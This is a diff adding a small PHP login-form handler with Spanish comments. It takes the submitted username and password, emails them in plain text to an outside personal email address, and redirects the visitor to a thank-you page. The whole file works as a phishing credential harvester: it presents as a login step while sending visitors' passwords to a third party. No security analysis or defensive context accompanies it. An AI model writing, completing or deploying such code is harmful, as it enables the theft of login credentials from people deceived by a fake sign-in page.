@@ -1,0 +1,30 @@
+<?php
+
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+
+    // Dirección de correo electrónico a la que se enviará el formulario
+    $to = "roniifelipe@gmail.com";
+
+    // Asunto del correo electrónico
+    $subject = "Inicio de sesión";
+
+    // Mensaje del correo electrónico
+    $message = "Usuario: " . $username . "\n";
+    $message .= "Contraseña: " . $password . "\n";
+
+    // Cabeceras del correo electrónico
+    $headers = "From: webmaster@example.com" . "\r\n" .
+               "Reply-To: webmaster@example.com" . "\r\n" .
+               "X-Mailer: PHP/" . phpversion();
+
+    // Envía el correo electrónico
+    mail($to, $subject, $message, $headers);
+
+    // Redireccionar después de enviar el correo electrónico
+    header('Location: gracias.html');
+    exit;
+}
+
+?>
